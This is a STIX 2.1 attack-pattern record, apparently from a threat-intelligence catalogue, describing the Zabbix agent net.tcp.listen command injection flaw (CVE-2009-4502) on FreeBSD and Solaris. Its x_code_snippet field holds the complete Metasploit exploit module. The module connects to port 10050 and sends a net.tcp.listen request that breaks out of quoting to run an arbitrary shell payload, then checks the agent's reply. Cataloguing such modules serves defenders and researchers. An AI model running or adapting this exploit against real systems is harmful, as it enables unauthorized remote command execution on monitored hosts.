{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9135250d-bb9d-4a3e-853b-173e6baf7b4f",
    "created": "2024-08-14T17:14:16.794497Z",
    "modified": "2024-08-14T17:14:16.794501Z",
    "name": "Zabbix Agent net.tcp.listen Command Injection",
    "description": " This module exploits a metacharacter injection vulnerability in the FreeBSD and Solaris versions of the Zabbix agent. This flaw can only be exploited if the attacker can hijack the IP address of an authorized server (as defined in the configuration file). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/misc/zabbix_agent_exec.rb",
            "external_id": "zabbix_agent_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4502"
        },
        {
            "source_name": "reference",
            "url": "https://support.zabbix.com/browse/ZBX-1032"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Zabbix Agent net.tcp.listen Command Injection',\n      'Description'    => %q{\n          This module exploits a metacharacter injection vulnerability\n        in the FreeBSD and Solaris versions of the Zabbix agent. This flaw\n        can only be exploited if the attacker can hijack the IP address\n        of an authorized server (as defined in the configuration file).\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-4502' ],\n          [ 'OSVDB', '60956' ],\n          [ 'URL', 'https://support.zabbix.com/browse/ZBX-1032'],\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'BadChars'    => \"'\",\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet',\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic Target', { }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-09-10'))\n\n    register_options(\n      [\n        Opt::RPORT(10050)\n      ])\n  end\n\n  def exploit\n    connect\n\n    rnd_port = rand(1024) + 1\n    buf = \"net.tcp.listen[#{rnd_port}';#{payload.encoded};']\\n\"\n\n    print_status(\"Sending net.tcp.listen() request to the zabbix agent...\")\n    sock.put(buf)\n\n    res = nil\n    begin\n      res = sock.get_once(-1, 5)\n    rescue ::EOFError\n    end\n\n    if ! res\n      print_status(\"The zabbix agent did not reply, our IP must not be in the allowed server list.\")\n      disconnect\n      return\n    end\n\n    if (res =~ /ZBX_NOTSUPPORTED/)\n      print_status(\"The zabbix agent is not running a vulnerable version or operating system.\")\n      disconnect\n      return\n    end\n\n    if(res !~ /ZBXD/)\n      print_status(\"The zabbix agent returned an unknown response.\")\n      disconnect\n      return\n    end\n\n    print_status(\"The zabbix agent should have executed our command.\")\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-09-10",
    "x_mitre_platforms": [
        "['unix']"
    ]
}